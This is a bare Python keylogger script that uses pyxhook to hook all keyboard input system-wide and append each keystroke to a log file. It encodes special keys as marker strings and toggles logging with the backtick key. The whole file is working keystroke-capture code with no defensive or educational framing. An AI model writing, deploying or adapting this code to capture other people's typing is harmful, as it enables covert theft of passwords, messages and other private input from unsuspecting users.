import pyxhook

file_path='/path/where/you/want/log/file.log'
log = True

def logit(event):
    if event.Ascii==32:
        return (' ')
    elif event.Key=="Return":
        return('\n')
    elif event.Key=="BackSpace":
        return('~<<<~')
    elif event.Key=="Caps_Lock":
        return('~C#L~')
    elif event.Key=="period":
        return('.')
    elif event.Key=="Left":
        return('~<-~')
    elif event.Key=="Right":
        return('~->~')
    elif event.Key=="Up":
        return('~^U-~')
    elif event.Key=="Down":
        return('~-D^~')
    elif event.Key in ["Control_L","Control_R"]:
        return('~!C!~')
    elif event.Key in ["Shift_R","Shift_L"]:
        return('~&S&~')
    elif event.Key in ["Alt_L","Alt_R"]:
        return('~@A@~')
    else:
        return(event.Key)


def press(event):
    global log
    f=open(file_path,'a')
    if event.Ascii==96:
        f.write(" ")
        if log:
            log=False
        else:
            log=True
    if log:
        f=open(file_path,'a')
        f.write(logit(event))
    else:
        f.close()


key_log=pyxhook.HookManager()
key_log.KeyDown=press
key_log.HookKeyboard()
key_log.start()
